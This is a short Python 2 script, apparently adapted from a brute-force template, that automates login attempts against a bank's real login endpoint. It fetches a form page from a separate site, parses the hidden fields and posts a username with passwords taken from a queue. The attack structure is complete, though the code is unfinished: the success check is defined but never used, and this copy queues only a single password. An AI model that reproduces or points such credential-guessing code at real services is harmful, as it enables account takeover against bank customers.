import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
import getpass

from HTMLParser import HTMLParser
from BruteParser import BruteParser

# general settings
user_thread = 1
username = 'bzr0014'
password = getpass.getpass()
resusme = None

# target specific settings
target_url = "http://rapidbaz.ir"
target_post = "https://connect.secure.wellsfargo.com/auth/login/do"

username_field = "j_username"
password_field = "j_password"

success_check = "mardas"

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        
        print "Finished setting up for: %s" % username
    
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)
            page = response.read()
            
            print "trying: %s : %s (%d left)" %\
                    (self.username, brute, self.password_q.qsize())
            
            # prase out the hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results
            
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read()

words = Queue.Queue()
words.put(password)
b = Bruter(username, words)
b.web_bruter()


